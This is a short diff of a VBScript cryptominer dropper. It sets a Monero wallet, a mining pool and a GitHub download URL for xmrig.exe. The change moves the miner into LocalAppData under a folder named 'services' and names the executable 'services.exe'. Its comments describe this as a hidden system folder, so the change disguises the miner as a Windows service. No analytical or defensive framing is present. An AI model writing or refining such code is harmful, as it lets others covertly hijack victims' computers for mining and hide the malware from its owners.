@@ -12,7 +12,10 @@ wallet = "48bBiT9hcQqJBZCXxKi6mSTzatRSN7kLMgjTBSQReTN8K7uCzxpn7ZuH7DUXua5uVLj4rR
 pool = "gulf.moneroocean.stream:10128"
 downloadUrl = "https://raw.githubusercontent.com/followtheyellowbrickroad321/miner-files/main/xmrig.exe"
 
-minerFolder = wsh.SpecialFolders("AppData") & "\miner"
+' --- CHANGES MADE HERE ---
+' Location: LocalAppData (Hidden System Folder)
+' Folder Name: \services
+minerFolder = wsh.SpecialFolders("LocalAppData") & "\services"
 minerName = "services.exe"
 
 ' 1. Create Folder
